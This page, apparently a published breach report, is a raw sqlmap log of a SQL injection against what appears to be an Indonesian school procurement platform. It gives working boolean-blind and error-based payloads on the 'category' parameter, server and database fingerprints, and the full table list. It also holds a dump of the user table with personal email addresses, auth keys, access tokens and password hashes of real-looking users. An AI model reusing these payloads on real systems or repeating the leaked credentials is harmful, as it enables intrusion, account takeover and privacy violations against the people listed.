---
ilustration: "/ilustration/"
penulis: ""
description: ""
slug: "intanonline"
title: "Intanonline Report"
date: 2024-07-31T15:00:08+07:00
---

```sql

sqlmap identified the following injection point(s) with a total of 291 HTTP(s) requests:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
               html error message fingerprint: MySQL
banner: '8.0.25-commercial'
available databases [7]:
[*] absahid
[*] information_schema
[*] mysql
[*] mysql_innodb_cluster_metadata
[*] performance_schema
[*] siplahintan
[*] sys

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: siplahintan
[192 tables]
+----------------------------------+
| agregasi_oldist                  |
| duplicat_product                 |
| ip_cart_history                  |
| ipr_activity                     |
| ipr_addons                       |
| ipr_agregasi_fail                |
| ipr_agregasi_pembayaran_satdik   |
| ipr_agregasi_produk_tbm          |
| ipr_anggaran                     |
| ipr_anggaran_kegiatan            |
| ipr_anggaran_produk              |
| ipr_anggaran_sumber_dana         |
| ipr_api_djp                      |
| ipr_api_djp_fail                 |
| ipr_article                      |
| ipr_article_attachment           |
| ipr_article_category             |
| ipr_assign_product_cat           |
| ipr_auto_number                  |
| ipr_bank_mp                      |
| ipr_bank_mp_mapping              |
| ipr_bank_store                   |
| ipr_bank_user                    |
| ipr_berita                       |
| ipr_c_compare                    |
| ipr_c_compare_item               |
| ipr_c_compare_item_detail        |
| ipr_c_compare_store              |
| ipr_cart                         |
| ipr_cart_chat                    |
| ipr_cart_compare                 |
| ipr_cart_compare_item            |
| ipr_cart_compare_item_detail     |
| ipr_cart_item                    |
| ipr_cart_item_import             |
| ipr_cart_nego_item               |
| ipr_cart_nego_item_msg           |
| ipr_checksums                    |
| ipr_classification               |
| ipr_code_dikbud                  |
| ipr_compare                      |
| ipr_compare_product              |
| ipr_complain                     |
| ipr_complain_detail              |
| ipr_complain_file                |
| ipr_complain_product             |
| ipr_cost_jaladara                |
| ipr_courier_partner              |
| ipr_courier_person               |
| ipr_courier_product              |
| ipr_districts                    |
| ipr_districts_pengawas           |
| ipr_doc                          |
| ipr_ebilling                     |
| ipr_educations_pengawas          |
| ipr_ematerai                     |
| ipr_etalase                      |
| ipr_featured_product             |
| ipr_featured_product_assign      |
| ipr_file_storage_item            |
| ipr_funds_pengawas               |
| ipr_hot_product                  |
| ipr_i18n_message                 |
| ipr_i18n_source_message          |
| ipr_img_bast                     |
| ipr_jne                          |
| ipr_key_storage_item             |
| ipr_login                        |
| ipr_master_bank                  |
| ipr_master_json                  |
| ipr_master_kegiatan              |
| ipr_master_kekayaan              |
| ipr_master_kekayaan_cat          |
| ipr_master_mapping_code          |
| ipr_master_mapping_districts     |
| ipr_master_status                |
| ipr_nego                         |
| ipr_nego_product                 |
| ipr_no_faktur                    |
| ipr_non_text_book_school_levels  |
| ipr_notification                 |
| ipr_npwp_dinas                   |
| ipr_option                       |
| ipr_option_value                 |
| ipr_order                        |
| ipr_order_address                |
| ipr_order_bast                   |
| ipr_order_compare                |
| ipr_order_compare_item           |
| ipr_order_compare_item_detail    |
| ipr_order_history                |
| ipr_order_nego_compare           |
| ipr_order_nego_item              |
| ipr_order_payment                |
| ipr_order_product                |
| ipr_order_store                  |
| ipr_page                         |
| ipr_payment_setting              |
| ipr_payment_to_store             |
| ipr_pengawas                     |
| ipr_ppn_tag                      |
| ipr_product                      |
| ipr_product_bundle               |
| ipr_product_bundle_import_result |
| ipr_product_category             |
| ipr_product_districts            |
| ipr_product_etalase              |
| ipr_product_file                 |
| ipr_product_import               |
| ipr_product_import_result        |
| ipr_product_import_tbm           |
| ipr_product_price                |
| ipr_product_rating               |
| ipr_product_shipping             |
| ipr_product_sku                  |
| ipr_product_sku_export           |
| ipr_product_spesification        |
| ipr_product_stock                |
| ipr_product_store                |
| ipr_product_tag                  |
| ipr_province                     |
| ipr_province_pengawas            |
| ipr_publishers                   |
| ipr_puskurbuk                    |
| ipr_puskurbuk_price              |
| ipr_quick_search                 |
| ipr_quick_search_product         |
| ipr_rbac_auth_assignment         |
| ipr_rbac_auth_item               |
| ipr_rbac_auth_item_child         |
| ipr_rbac_auth_rule               |
| ipr_request_cancel               |
| ipr_request_efaktur              |
| ipr_request_npwp                 |
| ipr_roles_pengawas               |
| ipr_sekolah                      |
| ipr_sertel_pajak                 |
| ipr_sertificate_digital_book     |
| ipr_session                      |
| ipr_setting_main                 |
| ipr_shipping_setting             |
| ipr_specs                        |
| ipr_specs_value                  |
| ipr_store                        |
| ipr_store_courier_partner        |
| ipr_store_detail                 |
| ipr_store_fav                    |
| ipr_store_file                   |
| ipr_store_owner                  |
| ipr_store_rating                 |
| ipr_store_user                   |
| ipr_store_wiljual                |
| ipr_subdistrict                  |
| ipr_sumber_dana                  |
| ipr_sumber_dana_sekolah          |
| ipr_system_db_migration          |
| ipr_system_log                   |
| ipr_system_rbac_migration        |
| ipr_tags                         |
| ipr_text_book_school_classes     |
| ipr_text_book_school_levels      |
| ipr_text_book_subjects           |
| ipr_timeline_event               |
| ipr_tmplogin                     |
| ipr_top_categories               |
| ipr_top_categories_header        |
| ipr_user                         |
| ipr_user_address                 |
| ipr_user_profile                 |
| ipr_user_sekolah                 |
| ipr_user_token                   |
| ipr_village                      |
| ipr_widget_carousel              |
| ipr_widget_carousel_item         |
| ipr_widget_menu                  |
| ipr_widget_text                  |
| ipr_wishlist                     |
| ipr_wishlist_product             |
| ipr_zona                         |
| ipr_zona_districts               |
| master_ongkir                    |
| matrik_ongkir                    |
| matrik_ongkir_150922             |
| matrik_ongkir_awal               |
| matrik_ongkir_lama               |
| matrik_ongkir_tran               |
| matriks_depo                     |
| sipl_kpiutang                    |
| sipl_uangmuka                    |
| tracking_order                   |
| trigger_access                   |
| type_ongkir                      |
+----------------------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: siplahintan
Table: ipr_user
[508 entries]
+------+----------------------+------------------------------------------------------+----------+----------------------------------+----------------------------------+------------+------------+------------+------------------------------------------+--------------+--------------------------------------------------------------+
| id   | oauth_client_user_id | email                                                | status   | auth_key                         | username                         | logged_at  | created_at | updated_at | access_token                             | oauth_client | password_hash                                                |
+------+----------------------+------------------------------------------------------+----------+----------------------------------+----------------------------------+------------+------------+------------+------------------------------------------+--------------+--------------------------------------------------------------+
| 0    | NULL                 | webmaster@example.com                                | 1        | lsvnssXlA53wsjp1I86Zj_24KfaalLim | webmaster                        | 1714811433 | 0          | 0          | hJJMwBAD-_xW7LYBMeF0mgGtACDww31tuFFq3f02 | NULL         | $2y$13$W53ntr7GSLkvbsZNvvvqEOCjC3rsOKemNQThNktpkdlW/YW.lnM5y |
| 2    | NULL                 | manager@example.com                                  | 2        | gQiZx9qos-Bz03DqxSqvz_wPDdhNh3Cj | manager                          | 1714812806 | 0          | 0          | fgcir3H5CMhpMHag_xBST4s9pYLGw1l0By-Pmq9W | NULL         | $2y$13$YY7SoSFVO7sGMM7jemQG5uo51inqTQm1KmP/yFLoR8pjhZYpVbusG |
| 3    | NULL                 | user@example.com                                     | 2        | DLBzvWhVmhyhqTi2koj5n-MjIt7hbgfH | user                             | NULL       | 0          | 0          | JgoAku8aWZtoIygFI5J3QC-FGkVGZrp9D6rfP1nL | NULL         | $2y$13$MHWJUFHTf5IlS8l1wB3NW.MqSMcrmLLgY5ndP9swPNVGMcTRP5FlS |
| 4    | NULL                 | user1@mail.com                                       | 1        | m5JrShp33AMZgwhIzky69Zq-lmyHL_zO | user1                            | NULL       | 0          | 0          | aNp7Kx3YY-jkwfpa7rypOCVzA3fEx9YGnXnLqQgY | NULL         | $2y$13$NY3EN6Nhww28QjRjXM0H9OvdWDNx1Rdtz73r1uB/XXWecobovGHBq |
| 5    | NULL                 | user2@mail.com                                       | 1        | y4eAmODk6iZ_sKWrw2z7IFvP1e6x4k4s | user2                            | NULL       | 0          | 0          | onmAl7-39S0wUg6xdkgH1sR6VHmW7ccBbT7JYm1- | NULL         | $2y$13$ukltFUc6ZJKBmTNfjBIDVuB8BN.97AQtmYeJQjsx7SXzwNPImFZne |
| 6    | NULL                 | beli01@mail.com                                      | 1        | 60sWyeL9dWwy_9WCylYoDLkqts-z3krg | beli01                           | 1659496031 | 0          | 1623482047 | oXyxCYZ3Xfnr_qZkk0USDApsVNHQmyHoM0_OzNJv | NULL         | $2y$13$WZPMSNDhQibfIYvZu6/z4uhEtPKvyz.Th3rVMmoyT5as3tvxjAHGe |
| 7    | NULL                 | adminaS@OKE.OCM                                      | 2        | iwjeH1mIts4KTHHrgwMH-h-Aydk5A_UA | beli02                           | NULL       | 0          | 0          | Uy_w1anfq_rw_M95NedTWQxkOCqGM4VJbzYsZuW8 | NULL         | $2y$13$eGEsQEYUcjV1SBtcmulgsOIfT.f3ZFOHF271.Bp5.JG./1p5BI.zu |
| 8    | NULL                 | adminsdsd@co.com                                     | 2        | OEYay5drBgeO4sbRYMC-oWTy-sIuuEsl | adminsdsd                        | NULL       | 0          | 0          | yDupW_U46lcXBsnAUpUiLG4Mj62SRph3GAvMmODz | NULL         | $2y$13$CjLJesbrnLsvx84sWC5OwOU4l0ICwOTUHse05f884EELOvuYx2EQq |
| 9    | NULL                 | adminxxx@gm.cm                                       | 1        | D1yPPKKvW59h7oyVCQet8oVviLsmKyXu | adminxxx                         | NULL       | 0          | 1623481126 | rDVHZKx0WdBfvjgbX69HNUweddnF6owtXki-BRg9 | NULL         | $2y$13$yzZW2aOGvPu9ncAO13xNMOea0h974b3AF0b3XIMAXTVgd..FAHBS. |
| 11   | NULL                 | buyer123@gmail.com                                   | 2        | tG6amp2tW5GBl58bATPBcx8nTN6sYabV | buyer123                         | 1721706094 | 0          | 1718094561 | kDoG9pKSY0RYowu2CZwSrUWTu6-YwIdTF_JHHJVE | NULL         | $2y$13$V9dJLh3UCUwwctuztk/zougSTScYyIy/AXsrbd.dPqe/HWCoYVgKS |
| 12   | NULL                 | penjual01@mail.com                                   | 2        | xdJVW2LB_ChXIeriYLuTYY7BQ148VJ-X | penjual01                        | 1624350343 | 0          | 0          | 1GusD0UYs17f3HLGBQ7kZ899a3POQwpKRZx7yYIc | NULL         | $2y$13$6gY.j5/YWvV7J/rCCWDEIuq5omeQujtIVemuEw7N/b9hmPXH1dDUW |
| 13   | NULL                 | penjual02@mail.com                                   | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | penjual02                        | 1721613006 | 0          | 1695348985 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$ofipUEQ.O/UMM9pgurGB0.CK6MCZmsCSu6pQUYxN/mLPGg.4Py4x6 |
| 14   | NULL                 | penjual03@mail.com                                   | 1        | AZ_4HM_hQY31yxVoE-vIIdTPd8ABqmgs | penjual03                        | 1622652975 | 0          | 0          | VFMKvq-zVTVhixiOs3-jYr9LPJH7ky_1svb0tfbk | NULL         | $2y$13$a6rU8OOaQ1iqJD8m3ltQaOgXmln4JNU6FF8PVftGC.7lXzP4FZTGK |
| 45   | NULL                 | adminMitra@gmail.com                                 | 2        | OrC9ODdGwxpOApPcFwOXUV6QDwKu2G53 | adminmitra                       | 1720255741 | 0          | 1665731668 | hAnhiPwnflGsJnRIDvAfvdDdZ3bunsXma8v13w00 | NULL         | $2y$13$ZH89nla6uh1eSeOPsrmyeeMbpuyK55K7MQKyzOlmx7r17nJbPNTqq |
| 72   | NULL                 | pengawas@gmail.com                                   | 2        | G38AMsHp6cAkCG18Rcjb4tDzZsL-6Dlz | pengawas                         | 1647956516 | 0          | 1624452422 | i1GWYuwzOs8EXFFwZSxjP2la0QAzyZPggGzpT0hX | NULL         | $2y$13$scdyy/ATh2enGuyqOArDKem8vlGq8bKkhldQ4UdYK3Nd6ZdQ3qHXe |
| 191  | NULL                 | candaadmin@gmail.com                                 | 2        | 3BweDRVTOT2Fv4TYWrt-zKWhr68JK0P- | candaadmin@gmail.com             | NULL       | 0          | 0          | x3b-MAltU6K-Uohh_0H9mO1J9YgdmEDL5C2F3cPo | NULL         | $2y$13$7ecbVFcxAFlYNqG7WEN09eduw7R1VqOR6BaMn3XJxGWlGgpLvVD16 |
| 192  | NULL                 | warsonocangkob@gmail.com                             | 1        | 65lPc96of7GKtF2N4yNXxFh2WpVVjDuQ | kepseksd01@datadik.id            | 1715302652 | 0          | 1706156775 | A2nM5lhppivbzqQL3J8k9wObTIHsAsDO0tmFM2mL | NULL         | $2y$13$7McAZ0dGvCNafqeCjUq9o.iR4jjpKJsLf4bD.B4y6MwDv0svNFy/W |
| 204  | NULL                 | esuprapto44@yahoo.com                                | 2        | JMUuUgJirovVu5J6kV51Wz7bJmL1lXmE | esuprapto44@yahoo.com            | 1673077229 | 0          | 1673077227 | 0tJ8aq0PJ5pQdYPCK9HcHXYx80jnv0VgS0dSi6Ch | NULL         | $2y$13$opriN1iX5av9VsZGnbOsROjUebtJTqgREKk7iKGwzRfHQq60OK5im |
| 211  | NULL                 | karsinah.sdn1waygalih@gmail.com                      | 2        | A6OpoEuxtq5oc0YGKNYotruXtOnnlB4j | karsinah.sdn1waygalih@gmail.com  | 1715739595 | 0          | 1715739593 | Oqv05nhhWLOBZTjK2zu1Y4bXYzEuOASDthxJVUJ9 | NULL         | $2y$13$UEXcjWcgMGm/kruTdWrSHOVy0.2AvZQPf2k6K0zGPeYSM.8ESTyca |
| 212  | NULL                 | zurnabillah@gmail.com                                | 1        | krkDVWcb2yak3CDu8nyvt7IMfdyOEcig | zurnabillah@gmail.com            | 1717818337 | 0          | 1717818336 | ASFpErVIih4FiXxBGxTUY93QKYoLbFlqJrYv599v | NULL         | $2y$13$XIR/GQouuDjGnFzvAql1IODqEgOP7NUBTjKCsN3FcfXRijyuCzOPC |
| 219  | NULL                 | idasusanti1234@yahoo.co.id                           | 2        | tCwepnhyTmOfkRThMv6nySrll02Ug1fI | warnisesil@gmail.com             | 1635480100 | 0          | 1635480100 | jnFtQMCpG6KRoQZovfWtxkOrbRXpFBa3rIq6l6Hw | NULL         | <blank>                                                      |
| 226  | NULL                 | warsonocangko@gmail.com                              | 2        | ZG5UzWzRpW92zwFkgkx00yngAdNkC21w | NULL                             | 1722243895 | 0          | 1722223489 | 5xEUvkbi5lcvkpzTiPvuxDlcBSQS2pyVaP6jeI7X | NULL         | $2y$13$ZuasO3yHyyp2P1946HpcqeTHyIp3rGclkyhTw5idpbpmHwNejZbhi |
| 233  | NULL                 | adminMitratest@gmail.com                             | 2        | 0MouTrmp7wc5GvQ1RA7eZKZeBYY7WBm6 | adminMitratest                   | 1623480771 | 0          | 1623480790 | _vWD-5zpJNS752r8W-jQ3kuvG2nRLOU5n3n04SH- | NULL         | $2y$13$vFkZ9ENEi3dDp6Z.vgZPx.WsPO9aCyfHZNnyuHCQQNznkNxAviFXO |
| 240  | NULL                 | adminMitraIP@mail.com                                | 1        | vpdk_vdFLjNMfkLNoRZn_OWflZT5RwK5 | adminMitraIP                     | NULL       | 0          | 0          | UIIDEu98L1iKV-MxY7TiBkQmt1py54ruIzVy0xgB | NULL         | $2y$13$FswCDZFKTSn9T/SBioIgaua/gxPhzDd4OdzEAcatOfsLt6xCgnooa |
| 246  | NULL                 | asnan.mpd@gmail.com                                  | 2        | M6haIDA6dusrU3mJBKcigU78i21I3AMI | asnan.mpd@gmail.com              | NULL       | 0          | 0          | 4oGwNHhSyhd0IS6B4DqjM1w79O2L766NZxmqH6jX | NULL         | <blank>                                                      |
| 247  | NULL                 | endangwahyu92@yahoo.co.id                            | 2        | JxnsLC3VQNhGQpVfwJ5Z47kx6mkeCqrS | endangwahyu92@yahoo.co.id        | 1637912438 | 0          | 1637912437 | DG7nYRo8cSlV3xdwQOjliYrU32IR374Tyd9r8EnL | NULL         | <blank>                                                      |
| 254  | NULL                 | budikasihati22@gmail.com                             | 1        | AhWX839In68UBS9Oc1Hpsq0uXh28VquN | budikasihati22@gmail.com         | 1693380393 | 0          | 1693380391 | AYRAIXXIimIqmSKQbLu8OsDkF2LcENUhwzfXDQFk | NULL         | $2y$13$W93j9nT7ol48no6TnIc8Autw23QljPlRygAhqdDDpLYrjnL9ACB9. |
| 260  | NULL                 | munawar_69@yahoo.com                                 | 2        | uBYiFZJ3Y7ZjdxuW6ej9DyYarfEzy9yc | munawar_69@yahoo.com             | 1712925613 | 2021       | 1711895935 | s12dZ12miWxP6bSLcPVX0zR3iYaUE6goOOa290Oi | NULL         | $2y$13$EppyI.SdReiyekiYD/J04eKIssGC12QjoLt0MdG7d7nuabJctBG8a |
| 261  | NULL                 | enyristianti153@gmail.com                            | 1        | 0lsOIoccjk1AfGO3cgLwmY5HYmmjLdkj | nelly712216@gmail.com            | 1623306700 | 0          | 1623306700 | CdadNBu8s36zHjCS3YmaRVc3Zauhl5uHA0BuPKAw | NULL         | <blank>                                                      |
| 267  | NULL                 | amalikbandung@gmail.cm                               | 2        | JUytZCFpciDGq7WSju60X8J51guePzgh | tatinurhayatismile@gmail.com     | 1680177500 | 0          | 1680177498 | ADDCwNfPbShRN1fJtrTRNgfRJdhaccHDEW3IA8H0 | NULL         | $2y$13$qDY0byXe5OnyLoyC0J6cnu/Wijt3l4WwgSE55ACCABqEBqPJ0HfAi |
| 274  | NULL                 | hendro_witjaksono@ymail.com                          | 2        | Jk5Xv7olLzeNY9dyL2u0wOdFLzyNCYgc | yadiyatie@gmail.com              | 1721713501 | 0          | 1721713500 | AZCOr5zjpZY40VB8zBNBssWGwqbEZqeUAvAaOvMn | NULL         | $2y$13$LccN8ivzPh.10WhsYRqHDuzzk6v/0JxEHWgsVoQOny3CJOjscMZj6 |
| 296  | NULL                 | gagahgelap@gmail.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | gagahgelap@gmail.com             | NULL       | 0          | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 303  | NULL                 | bos.afirmasi@gmail.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | bos.afirmasi@gmail.com           | 1688712412 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 310  | NULL                 | akuisme@boyolali.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | akuisme@boyolali.com             | 1688699273 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 317  | NULL                 | mbekti_ae@yahoo.com                                  | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | mbekti_ae@yahoo.com              | 1718926342 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 324  | NULL                 | pesan.apsara@gmail.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pesan.apsara@gmail.com           | 1722238518 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 331  | NULL                 | akuisme@aneka.com                                    | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | akuisme@aneka.com                | 1623308511 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 338  | NULL                 | imam_prasetyo@cbn.net.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | imam_prasetyo@cbn.net.id         | 1716257662 | NULL       | 1638427768 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$ePDOAKEqisxvxZNinRYKw.mbzLfqYUbwivgz27khnMNm1HYe48dja |
| 345  | NULL                 | cv.berkahcemerlang@yahoo.co.id                       | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | cv.berkahcemerlang@yahoo.co.id   | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 352  | NULL                 | balidwipajaya.cv@gmail.com                           | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | balidwipajaya.cv@gmail.com       | 1722241341 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 359  | NULL                 | akuisme@semarang.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | akuisme@semarang.com             | 1688972590 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 366  | NULL                 | banuapermatalestari@gmail.com                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | banuapermatalestari@gmail.com    | 1722241663 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 373  | NULL                 | boronglo2020@gmail.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | boronglo2020@gmail.com           | 1709013326 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 380  | NULL                 | binasaranapustaka@yahoo.co.id                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | binasaranapustaka@yahoo.co.id    | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 387  | NULL                 | carakadarmaaksara@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | carakadarmaaksara@gmail.com      | 1722216016 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 394  | NULL                 | cahayaedukasi2016@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | cahayaedukasi2016@gmail.com      | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 401  | NULL                 | ceo@cempakaputih.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | ceo@cempakaputih.com             | 1722236223 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 408  | NULL                 | bumiflobamura@gmail.com                              | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | bumiflobamura@gmail.com          | 1722240765 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 415  | NULL                 | siplahasj@mitraedu.co.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | siplahasj@mitraedu.co.id         | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 422  | NULL                 | siplahbm@mitraedu.co.id                              | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | siplahbm@mitraedu.co.id          | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 429  | NULL                 | mugiekembar@gmail.com                                | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | mugiekembar@gmail.com            | 1722241373 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 436  | NULL                 | siplahusb@mitraedu.co.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | siplahusb@mitraedu.co.id         | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 443  | NULL                 | gentalausahabesamo@gmail.com                         | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | gentalausahabesamo@gmail.com     | 1722241436 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 450  | NULL                 | humaharatiraya@gmail.com                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | humaharatiraya@gmail.com         | 1722237145 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 457  | NULL                 | katijo_papua@yahoo.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | katijo_papua@yahoo.com           | 1722242121 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 464  | NULL                 | naulibasa202020@gmail.com                            | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | naulibasa202020@gmail.com        | 1722241617 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 471  | NULL                 | edy151261@yahoo.co.id                                | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | edy151261@yahoo.co.id            | 1721361316 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$J7EIMdPORTL/HKQYcuMeIOazLRAZoqsvCQ05JABIddvcA1ZMHNnFS |
